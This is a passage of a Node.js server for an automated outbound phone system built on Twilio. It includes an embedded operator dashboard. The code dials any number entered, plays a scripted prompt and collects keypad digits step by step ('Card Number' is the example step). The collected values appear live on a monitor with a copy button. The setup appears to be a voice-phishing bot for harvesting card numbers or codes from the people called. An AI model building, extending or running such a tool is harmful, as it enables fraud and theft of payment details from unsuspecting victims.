
async function saveScript() {
  const script = {
    greeting: {
      message: document.getElementById('s-greeting-msg').value,
      timeout: parseInt(document.getElementById('s-greeting-timeout').value) || 10,
      noInputMessage: document.getElementById('s-greeting-noinput').value
    },
    steps: collectSteps(),
    successMessage: document.getElementById('s-success').value,
    cancelMessage: document.getElementById('s-cancel').value,
    errorMessage: document.getElementById('s-error').value
  };
  try {
    await fetch('/api/script', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(script) });
    steps = script.steps;
    showSaved('script-save-status');
  } catch(e) { alert('Save failed.'); }
}

function collectSteps() {
  const cards = document.querySelectorAll('.step-card');
  return Array.from(cards).map((card, i) => ({
    label: card.querySelector('.step-name-input').value || \`Step \${i+1}\`,
    message: card.querySelector('.step-msg').value,
    maxDigits: parseInt(card.querySelector('.step-digits').value) || 5,
    timeout: parseInt(card.querySelector('.step-timeout').value) || 15,
    confirmMessage: card.querySelector('.step-confirm').value
  }));
}

function renderSteps() {
  const list = document.getElementById('steps-list');
  list.innerHTML = steps.map((s, i) => \`
    <div class="step-card" id="step-card-\${i}">
      <div class="step-header">
        <div class="step-num">\${i+1}</div>
        <input class="step-name-input" value="\${esc(s.label)}" placeholder="Step name (e.g. Card Number)"/>
        <button class="btn-remove" onclick="removeStep(\${i})" title="Remove step">×</button>
      </div>
      <div class="step-grid">
        <div class="step-field step-full">
          <label>What the bot says (prompt to the caller)</label>
          <textarea class="step-msg" rows="2" placeholder="Please enter your...">\${esc(s.message)}</textarea>
        </div>
        <div class="step-field">
          <label>Max digits to collect</label>
          <input type="number" class="step-digits" value="\${s.maxDigits || 5}" min="1" max="20" placeholder="5"/>
        </div>
        <div class="step-field">
          <label>Timeout (seconds)</label>
          <input type="number" class="step-timeout" value="\${s.timeout || 15}" min="5" max="60" placeholder="15"/>
        </div>
        <div class="step-field step-full">
          <label>Confirmation message (said after receiving input)</label>
          <input type="text" class="step-confirm" value="\${esc(s.confirmMessage || '')}" placeholder="Thank you. "/>
        </div>
      </div>
    </div>
  \`).join('');
}

function addStep() {
  steps.push({ label: \`Step \${steps.length + 1}\`, message: '', maxDigits: 5, timeout: 15, confirmMessage: 'Thank you. ' });
  renderSteps();
  document.getElementById('steps-list').lastElementChild?.scrollIntoView({ behavior:'smooth', block:'nearest' });
}

function removeStep(i) {
  if (steps.length <= 1) { alert('You need at least one step.'); return; }
  steps.splice(i, 1);
  renderSteps();
}

function esc(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

// ── Call initiation ─────────────────────────────────────────────────────────
async function testConnection() {
  const msg = document.getElementById('callMsg');
  msg.textContent = '⏳ Testing connection...';
  msg.className = 'call-msg';
  msg.style.display = 'block';
  msg.style.background = '#4a8ff718';
  msg.style.border = '1px solid #4a8ff735';
  msg.style.color = 'var(--blue)';
  try {
    const r = await fetch('/api/test');
    const d = await r.json();
    if (d.ok) {
      msg.textContent = '✅ Connection good! Twilio is connected. Try calling now.';
      msg.style.background = '#10e08518';
      msg.style.border = '1px solid #10e08535';
      msg.style.color = 'var(--green)';
    } else {
      msg.textContent = '❌ Problem: ' + d.error;
      msg.style.background = '#f0444a18';
      msg.style.border = '1px solid #f0444a35';
      msg.style.color = 'var(--red)';
    }
  } catch(e) {
    msg.textContent = '❌ Cannot reach server. Is your Render app awake?';
    msg.style.background = '#f0444a18';
    msg.style.border = '1px solid #f0444a35';
    msg.style.color = 'var(--red)';
  }
}

async function initiateCall() {
  const phone = document.getElementById('phoneInput').value.trim();
  const label = document.getElementById('labelInput').value.trim();
  if (!phone) { showCallMsg('Please enter a phone number.', 'err'); return; }
  const btn = document.getElementById('callBtn');
  btn.disabled = true;
  document.getElementById('callBtnText').textContent = 'CALLING...';
  document.getElementById('callBtnIcon').textContent = '⏳';
  hideCallMsg();
  try {
    const r = await fetch('/api/call', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ phoneNumber:phone, label:label||'Call' }) });
    const d = await r.json();
    if (d.success) {
      showCallMsg('✅ Call initiated! Watch the monitor.', 'ok');
      document.getElementById('phoneInput').value = '';
      document.getElementById('labelInput').value = '';
      switchTab('monitor', document.querySelector('.tab'));
    } else {
      showCallMsg('❌ Error: ' + (d.error||'Unknown error — check Settings tab'), 'err');
    }
  } catch(e) { showCallMsg('❌ Cannot connect to server.', 'err'); }
  btn.disabled = false;
  document.getElementById('callBtnText').textContent = 'CALL NOW';
  document.getElementById('callBtnIcon').textContent = '📲';
}

function showCallMsg(txt, type) { const el=document.getElementById('callMsg'); el.textContent=txt; el.className='call-msg '+type; el.style.display='block'; }
function hideCallMsg() { const el=document.getElementById('callMsg'); el.style.display='none'; el.className='call-msg'; }

document.getElementById('phoneInput').addEventListener('keypress', e => { if(e.key==='Enter') initiateCall(); });

// ── Poll sessions ───────────────────────────────────────────────────────────
async function pollSessions() {
  try {
    const r = await fetch('/api/sessions');
    sessions = await r.json();
    renderMonitor(sessions);
    updateStats(sessions);
  } catch(e) {}
}

function updateStats(s) {
  const active = s.filter(x => x.status === 'in-progress' || x.status === 'initiated').length;
  const done = s.filter(x => x.status === 'completed').length;
  document.getElementById('stat-active').textContent = active;
  document.getElementById('stat-total').textContent = s.length;
  document.getElementById('stat-done').textContent = done;
}

function renderMonitor(sessions) {
  const grid = document.getElementById('monitor-grid');
  const empty = document.getElementById('empty-state');
  if (!sessions.length) { empty.style.display = 'flex'; return; }
  empty.style.display = 'none';

  const totalSteps = currentScript.steps?.length || 0;

  sessions.forEach(s => {
    let card = document.getElementById('crd-' + s.callSid);
    const isNew = !card;
    if (isNew) {
      card = document.createElement('div');
      card.id = 'crd-' + s.callSid;
      grid.insertBefore(card, grid.firstChild);
    }

    const statusClass = s.status.replace(/[^a-z]/g, '-');
    card.className = \`call-card s-\${statusClass}\`;

    // Badge
    const badgeLabel = s.status.replace(/-/g,' ').toUpperCase();
    const isActive = s.status === 'in-progress';
    const badge = \`<span class="badge badge-\${s.status}"><span class="badge-dot \${isActive ? 'badge-dot-pulse' : ''}"></span>\${badgeLabel}</span>\`;

    // Progress
    let prog = '';
    if (totalSteps > 0) {
      const done = s.collected.length;
      prog = '<div class="prog-track">' + Array.from({length: totalSteps}, (_, i) => {
        const cls = i < done ? 'done' : (i === done && isActive ? 'active' : '');
        return \`<div class="prog-seg \${cls}"></div>\`;
      }).join('') + '</div>';
    }

    // Collected items
    let collected = '';
    if (s.collected.length) {
      collected = '<div class="collected-list">' + s.collected.map(c => {
        const t = new Date(c.time).toLocaleTimeString();
        return \`<div class="collected-item"><span class="ci-label">\${c.label}</span><span class="ci-value">\${c.value}</span><span class="ci-time">\${t}</span></div>\`;
      }).join('') + '</div>';
    }

    // Status detail
    let detail = '';
    if (s.statusDetail) {
      detail = \`<div class="status-detail"><div class="sd-dot \${isActive ? 'active' : ''}"></div>\${s.statusDetail}</div>\`;
    }

    // Copy button (show if has collected data)
    let actions = '';
    if (s.collected.length > 0) {
      actions = \`<div class="card-actions"><button class="btn-copy" onclick="copyData('\${s.callSid}')">Copy Data</button></div>\`;
    }

    const t = new Date(s.startTime).toLocaleTimeString();
    card.innerHTML = \`
      <div class="card-head">
        <div>
          <div class="card-phone">\${s.phone}</div>
          <div class="card-meta-label">\${s.label}</div>
        </div>
        <div class="card-right">
          <div class="card-time">\${t}</div>
          \${badge}
        </div>
      </div>
      <div class="card-body">
        \${prog}
        \${collected}
        \${detail}
        \${actions}
      </div>\`;
  });
}

// copy collected data as text
function copyData(sid) {
  const s = sessions.find(x => x.callSid === sid);
  if (!s) return;
  const lines = [\`Phone: \${s.phone}\`, \`Label: \${s.label}\`, \`Time: \${new Date(s.startTime).toLocaleString()}\`, '', ...s.collected.map(c => \`\${c.label}: \${c.value}\`)];
  navigator.clipboard.writeText(lines.join('\\n')).then(() => {
    const btn = document.querySelector(\`#crd-\${sid} .btn-copy\`);
    if (btn) { btn.textContent = '✓ Copied!'; setTimeout(() => btn.textContent = 'Copy Data', 1500); }
  });
}

// ── Show saved indicator ──────────────────────────────────────────────────
function showSaved(id) {
  const el = document.getElementById(id);
  el.classList.add('visible');
  setTimeout(() => el.classList.remove('visible'), 2500);
}

// ── Init ──────────────────────────────────────────────────────────────────
loadSettings();
loadScript();
pollSessions();
setInterval(pollSessions, 2000);
</script>
</body>
</html>
`;

app.get("/", (req,res) => res.send(DASHBOARD_HTML));
app.get("/api/settings",(req,res)=>{ const s=loadSettings(); res.json({...s,authToken:s.authToken?"••••••••"+s.authToken.slice(-4):""}); });
app.post("/api/settings",(req,res)=>{ const c=loadSettings(); const u={...c,...req.body}; if(req.body.authToken&&req.body.authToken.startsWith("••")) u.authToken=c.authToken; saveSettings(u); res.json({success:true}); });
app.get("/api/script",(req,res)=>res.json(loadScript()));
app.post("/api/script",(req,res)=>{ saveScript(req.body); res.json({success:true}); });
app.get("/api/sessions",(req,res)=>{ res.json(Object.values(callSessions).sort((a,b)=>new Date(b.startTime)-new Date(a.startTime))); });


app.get("/api/test", async(req,res)=>{
  const s=loadSettings();
  if(!s.accountSid||!s.accountSid.startsWith("AC")) return res.json({ok:false,error:"Twilio Account SID is missing or wrong. Go to Settings tab and check it starts with AC."});
  if(!s.authToken||s.authToken.length<10) return res.json({ok:false,error:"Twilio Auth Token is missing. Go to Settings tab and enter it."});
  if(!s.fromNumber) return res.json({ok:false,error:"Twilio Phone Number is missing. Go to Settings tab and enter it."});
  if(!s.baseUrl||!s.baseUrl.startsWith("http")) return res.json({ok:false,error:"Server URL is missing or wrong. Go to Settings tab, click Auto-detect and save."});
  try{
    const client=require("twilio")(s.accountSid,s.authToken);
    const account=await client.api.accounts(s.accountSid).fetch();
    return res.json({ok:true,accountName:account.friendlyName});
  }catch(err){
    return res.json({ok:false,error:"Twilio rejected credentials: "+err.message});
  }
});

app.post("/api/call", async(req,res)=>{
  const {phoneNumber,label}=req.body;
  if(!phoneNumber) return res.status(400).json({error:"Phone number required."});
  const settings=loadSettings(); const client=makeTwilioClient();
  if(!client) return res.status(400).json({error:"Twilio credentials not configured. Go to the Settings tab first."});
  try{
    const call=await client.calls.create({ to:phoneNumber, from:settings.fromNumber, url:settings.baseUrl+"/twiml/start", statusCallback:settings.baseUrl+"/twiml/status", statusCallbackMethod:"POST", statusCallbackEvent:["initiated","ringing","answered","completed"] });
    callSessions[call.sid]={ callSid:call.sid, phone:phoneNumber, label:label||"Call", status:"initiated", statusDetail:"Dialing...", startTime:new Date().toISOString(), currentStep:-1, collected:[] };
    res.json({success:true,callSid:call.sid});
  }catch(err){ res.status(500).json({error:err.message}); }
});

app.post("/twiml/start",(req,res)=>{ const {voice,language,baseUrl}=loadSettings(); const script=loadScript(); const {VoiceResponse}=require("twilio").twiml; const twiml=new VoiceResponse(); const sid=req.body.CallSid; if(callSessions[sid]) callSessions[sid].statusDetail="Playing greeting..."; const g=twiml.gather({numDigits:1,action:baseUrl+"/twiml/greeting-response",method:"POST",timeout:script.greeting.timeout}); g.say({voice,language},script.greeting.message); twiml.say({voice,language},script.greeting.noInputMessage); twiml.hangup(); res.type("text/xml").send(twiml.toString()); });
app.post("/twiml/greeting-response",(req,res)=>{ const {voice,language,baseUrl}=loadSettings(); const script=loadScript(); const {VoiceResponse}=require("twilio").twiml; const twiml=new VoiceResponse(); const sid=req.body.CallSid; const digit=req.body.Digits; if(digit==="2"){ if(callSessions[sid]){callSessions[sid].status="cancelled";callSessions[sid].statusDetail="Caller declined";} twiml.say({voice,language},script.cancelMessage); twiml.hangup(); return res.type("text/xml").send(twiml.toString()); } if(digit==="1"){ if(callSessions[sid]){callSessions[sid].status="in-progress";callSessions[sid].statusDetail="Accepted";} return res.redirect(307,baseUrl+"/twiml/step/0"); } twiml.say({voice,language},"Invalid input. "+script.greeting.message); twiml.redirect(baseUrl+"/twiml/start"); res.type("text/xml").send(twiml.toString()); });
app.all("/twiml/step/:index",(req,res)=>{ const {voice,language,baseUrl}=loadSettings(); const script=loadScript(); const {VoiceResponse}=require("twilio").twiml; const index=parseInt(req.params.index,10); const step=script.steps[index]; const sid=req.body.CallSid; const twiml=new VoiceResponse(); if(!step){ if(callSessions[sid]){callSessions[sid].status="completed";callSessions[sid].statusDetail="All steps completed";} twiml.say({voice,language},script.successMessage); twiml.hangup(); return res.type("text/xml").send(twiml.toString()); } if(callSessions[sid]){callSessions[sid].currentStep=index;callSessions[sid].statusDetail="Waiting: "+step.label;} const g=twiml.gather({numDigits:step.maxDigits,finishOnKey:"#",action:baseUrl+"/twiml/collect/"+index,method:"POST",timeout:step.timeout}); g.say({voice,language},step.message); twiml.say({voice,language},script.errorMessage); twiml.hangup(); res.type("text/xml").send(twiml.toString()); });
app.post("/twiml/collect/:index",(req,res)=>{ const {voice,language,baseUrl}=loadSettings(); const script=loadScript(); const {VoiceResponse}=require("twilio").twiml; const index=parseInt(req.params.index,10); const sid=req.body.CallSid; const digits=req.body.Digits; const step=script.steps[index]; const twiml=new VoiceResponse(); if(callSessions[sid]){ callSessions[sid].collected.push({step:index,label:step.label,value:digits,time:new Date().toISOString()}); callSessions[sid].currentStep=index+1; callSessions[sid].statusDetail="Received: "+step.label; } if(index===script.steps.length-1&&digits==="2"){ if(callSessions[sid]){callSessions[sid].status="cancelled";callSessions[sid].statusDetail="Caller cancelled";} twiml.say({voice,language},script.cancelMessage); twiml.hangup(); return res.type("text/xml").send(twiml.toString()); } if(step.confirmMessage) twiml.say({voice,language},step.confirmMessage); twiml.redirect(baseUrl+"/twiml/step/"+(index+1)); res.type("text/xml").send(twiml.toString()); });
app.post("/twiml/status",(req,res)=>{ const sid=req.body.CallSid; const cs=req.body.CallStatus; if(callSessions[sid]){ const s=callSessions[sid]; if(cs==="ringing") s.statusDetail="Ringing..."; else if(cs==="answered"){s.status="in-progress";s.statusDetail="Connected";} else if(cs==="completed"&&!["cancelled","completed"].includes(s.status)){s.status="completed";s.statusDetail="Call ended";} else if(["no-answer","busy","failed"].includes(cs)){s.status=cs;s.statusDetail=cs.replace("-"," ");} if(["completed","cancelled","no-answer","busy","failed"].includes(cs)) s.endTime=new Date().toISOString(); } res.sendStatus(200); });

const PORT=process.env.PORT||3000;
app.listen(PORT,()=>console.log("\n✅ IVR System running → http://localhost:"+PORT+"\n"));
